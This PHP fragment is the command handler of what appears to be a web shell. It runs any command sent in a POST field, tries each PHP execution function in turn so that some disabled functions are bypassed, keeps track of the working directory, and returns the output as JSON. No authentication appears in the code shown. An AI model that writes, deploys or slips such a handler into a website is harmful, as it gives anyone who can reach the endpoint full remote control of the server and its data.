if (isset($_POST['action']) && $_POST['action'] === 'shell') {
ob_end_clean();
header('Content-Type: application/json');
$cmd = $_POST['cmd'] ?? '';
$cwd = $_POST['cwd'] ?? getcwd();
$timeout = (int)($_POST['timeout'] ?? 30);
set_time_limit($timeout > 0 ? $timeout : 30);
$maxOutput = 5 * 1024 * 1024; // 5MB output cap

if (!is_dir($cwd)) $cwd = getcwd();

// Probe for best available exec function (priority order)
$method = null;
foreach (['system','exec','shell_exec','passthru','popen','proc_open'] as $fn) {
if (function_exists($fn)) { $method = $fn; break; }
}

if (!$method) {
echo json_encode(['error' => 'No OS exec function available', 'available' => false]);
exit;
}

if ($cmd === '') {
// Probe only — return which function is available
echo json_encode(['available' => true, 'method' => $method, 'cwd' => $cwd, 'output' => '']);
exit;
}

// cd into working directory, run command, capture new cwd
// Marker uses hex nonce to avoid collision with command output
$cwdMarker = '__CWDM_' . bin2hex(random_bytes(4));
$fullCmd = 'cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1; echo "' . $cwdMarker . ':$(pwd)"';
$output = '';
$truncated = false;

switch ($method) {
case 'system':
ob_start();
@system($fullCmd);
$output = ob_get_clean();
break;
case 'exec':
$lines = [];
@exec($fullCmd, $lines);
$output = implode("\n", $lines);
break;
case 'shell_exec':
$output = @shell_exec($fullCmd) ?? '';
break;
case 'passthru':
ob_start();
@passthru($fullCmd);
$output = ob_get_clean();
break;
case 'popen':
$handle = @popen($fullCmd, 'r');
if ($handle) {
while (!feof($handle)) {
$output .= fread($handle, 8192);
if (strlen($output) > $maxOutput) { $truncated = true; break; }
}
pclose($handle);
}
break;
case 'proc_open':
$desc = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
$proc = @proc_open($fullCmd, $desc, $pipes);
if (is_resource($proc)) {
$output = stream_get_contents($pipes[1], $maxOutput) . stream_get_contents($pipes[2], $maxOutput);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($proc);
}
break;
}

if (strlen($output) > $maxOutput) {
$output = substr($output, 0, $maxOutput);
$truncated = true;
}

// Extract new cwd from output
$newCwd = $cwd;
if (preg_match('/' . preg_quote($cwdMarker, '/') . ':(.+)$/m', $output, $m)) {
$newCwd = trim($m[1]);
$output = preg_replace('/' . preg_quote($cwdMarker, '/') . ':.+\n?$/', '', $output);
}

$result = [
'output' => rtrim($output),
'cwd' => $newCwd,
'method' => $method,
'available' => true,
];
if ($truncated) $result['truncated'] = true;

echo json_encode($result);
exit;
}
